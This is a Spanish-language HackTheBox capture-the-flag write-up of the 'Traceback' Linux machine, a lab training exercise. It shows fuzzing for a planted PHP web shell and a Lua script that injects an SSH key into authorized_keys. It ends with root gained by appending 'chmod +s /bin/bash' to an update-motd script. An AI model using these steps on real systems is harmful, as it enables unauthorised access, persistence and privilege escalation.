---
title: HackTheBox - Traceback
author: cotes
date: 2023-09-20 17:51:00 +0800
categories: [Writeup, HackTheBox, Easy]
tags: [Linux, 'Information Leakage', 'Update-Motd Abusing']
math: true
mermaid: true
image:
  path: /assets/images/HTB/Easy/Traceback/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Traceback Machine Logo
---

Máquina Linux de nivel **Easy** de HackThBox.

Técnicas usadas: **Information Leakage, Update-Motd Abusing**

### Fase de Reconocimiento 🧣

a. Enumeramos los puertos que están abiertos.

* **`nmap -p- -sS -Pn -n <IP> -oG puertos`**

    ![](/assets/images/HTB/Easy/Traceback/01-ports.png)

b. Vemos las versiones de los servicios que se están ejecutando en los puertos abiertos

* **`nmap -p<Puertos> -sCV <IP> -oN versiones`**

    ![](/assets/images/HTB/Easy/Traceback/02-versions.png)

c. Al inspeccionar el código fuente de la página web, veremos un mensaje

![](/assets/images/HTB/Easy/Traceback/03-web.png)

* Aquí nos da la pista de [Some of the best web shells](https://github.com/TheBinitGhimire/Web-Shells), este es un repositorio que cuenta con múltiples web shell en php, por lo que, fuzzearemos por los nombres de estas en el servicio web

    ```bash
    ❯ wfuzz -c -t 100 --hc=404 -w ./shells.txt 'http://10.10.10.181/FUZZ/'

    <SNIP>
    000000015:   200        58 L     100 W      1261 Ch     "smevk.php" 
    ```

d. Con esta web shell descubierta nos entablamos una reverse shell (Las credenciales válidas para la webshell son `admin:admin`)

![](/assets/images/HTB/Easy/Traceback/04-reverse.png)

### Escalada de Privilegios 💹

a. Para maniobrar cómodamente generemos un par de claves id_rsa

```bash
webadmin@traceback:/home/webadmin/.ssh$ ssh-keygen
webadmin@traceback:/home/webadmin/.ssh$ cat id_rsa.pub > authorized_keys
```

* Ahora nos copiamos la clave privada y nos podemos conectar por ssh

b. Leemos la nota de nuestro directorio y también nuestro fichero **.bash_history**

```bash
webadmin@traceback:~$ cat note.txt 
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.

webadmin@traceback:~$ cat .bash_history 
sudo -u sysadmin /home/sysadmin/luvit privesc.lua
```

> Podemos ejecutar cualquier script de lua como el usuario **sysadmin**
{: .prompt-info }

c. Ahora, generamos un par de claves **id_rsa** en nuestra máquina de atacante y copiaremos el fichero **id_rsa.pub** para copiarlo en `/home/sysadmin/.ssh/authorized_keys` y podernos conectar por SSH como el usuario sysadmin

```bash
❯ ssh-keygen
❯ cat id_rsa.pub | xclip -sel clip
```

* Ahora crearemos el script de lua que nos permitirá realizar todo lo descrito anteriormente

    ```lua
    local comando = "echo -n '[Clave id_rsa.pub]' > /home/sysadmin/.ssh/authorized_keys"

    local handle = io.popen(comando)
    local resultado = handle:read("*a") 

    handle:close()

    print("Salida del comando:")
    print(resultado)
    ```

* Finalmente ejecutamos el script como sysadmin y ya nos podremos conectar con nuestra clave privada al servicio SSH

    ```bash
    webadmin@traceback:/tmp$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
    ---------------------------------------------------------------------------
    ❯ ssh sysadmin@10.10.10.181 -i id_rsa
    $ bash
    sysadmin@traceback:~$ 
    ```

d. Buscamos ficheros en los que tengamos capacidad de escritura

```bash
sysadmin@traceback:~$ find / -writable 2>/dev/null | grep -vE "^/proc|^/run|^/lib|^/dev|^/sys"
/etc/update-motd.d/50-motd-news
/etc/update-motd.d/10-help-text
/etc/update-motd.d/91-release-upgrade
/etc/update-motd.d/00-header
/etc/update-motd.d/80-esm
<SNIP>
```

* Al buscar formas de escalar privilegios encontramos este [post](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/update-motd-privilege-escalation/)

e. Inyectamos un comando para darle permiso SUID a la bash. Luego nos desconectamos y conectamos al servicio SSH para que el comando se ejecute

```bash
sysadmin@traceback:~$ echo "chmod +s /bin/bash" >> 00-header
sysadmin@traceback:~$ exit
-------------------------------------------------------------
❯ ssh sysadmin@10.10.10.181 -i id_rsa
-------------------------------------------------------------
$ bash -p
bash-4.4# whoami
root
```